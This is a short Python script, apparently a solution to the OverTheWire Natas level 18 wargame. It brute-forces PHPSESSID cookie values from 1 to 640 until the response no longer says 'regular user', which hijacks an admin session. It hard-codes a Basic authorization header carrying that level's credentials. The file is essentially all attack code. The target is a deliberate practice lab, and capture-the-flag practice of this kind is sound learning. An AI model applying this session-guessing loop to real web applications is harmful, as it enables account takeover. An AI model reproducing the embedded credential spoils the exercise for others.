#! /usr/bin/env python3
import string
import urllib.parse
import requests

url = "http://natas18.natas.labs.overthewire.org/index.php"
headers = {'Authorization': 'Basic bmF0YXMxODp4dktJcURqeTRPUHY3d0NSZ0RsbWowcEZzQ3NEamhkUA==', 'Cookie': 'PHPSESSID={sessionId}'}
for x in range(1,641):
    tryHeader = dict(headers)
    tryHeader['Cookie'] = tryHeader['Cookie'].format(sessionId=x)
    print (tryHeader['Cookie'])
    response = requests.get(url,headers=tryHeader, timeout=5)
    if('regular user' not in response.text):
        print (x, response.text)
        break
